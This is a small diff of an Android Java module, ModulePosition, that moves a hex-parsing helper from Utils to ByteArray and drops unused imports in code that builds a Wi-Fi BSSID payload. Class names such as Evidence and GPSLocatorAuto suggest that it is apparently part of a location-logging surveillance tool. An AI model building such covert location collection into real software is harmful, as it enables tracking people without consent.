@@ -9,7 +9,6 @@
 
 package com.android.networking.module;
 
-import java.io.IOException;
 import java.util.Date;
 
 import android.content.Context;
@@ -25,16 +24,15 @@ import com.android.networking.LogR;
 import com.android.networking.Status;
 import com.android.networking.auto.Cfg;
 import com.android.networking.conf.ConfModule;
-import com.android.networking.conf.Configuration;
 import com.android.networking.conf.ConfigurationException;
 import com.android.networking.evidence.Evidence;
 import com.android.networking.evidence.EvidenceType;
 import com.android.networking.interfaces.IncrementalLog;
 import com.android.networking.module.position.GPSLocatorAuto;
+import com.android.networking.util.ByteArray;
 import com.android.networking.util.Check;
 import com.android.networking.util.DataBuffer;
 import com.android.networking.util.DateTime;
-import com.android.networking.util.Utils;
 
 public class ModulePosition extends BaseInstantModule implements IncrementalLog, LocationListener {
 	private static final String TAG = "ModulePosition"; //$NON-NLS-1$
@@ -330,10 +328,10 @@ public class ModulePosition extends BaseInstantModule implements IncrementalLog,
 		final DataBuffer databuffer = new DataBuffer(payload, 0, payload.length);
 
 		for (int i = 0; i < 6; i++) {
-			final byte[] token = Utils.hexStringToByteArray(bssid, i * 3, 2);
+			final byte[] token = ByteArray.hexStringToByteArray(bssid, i * 3, 2);
 
 			// debug.trace("getWifiPayload " + i + " : "
-			// + Utils.byteArrayToHex(token));
+			// + ByteArray.byteArrayToHex(token));
 
 			if (Cfg.DEBUG) {
 				Check.asserts(token.length == 1, "getWifiPayload: token wrong size"); //$NON-NLS-1$
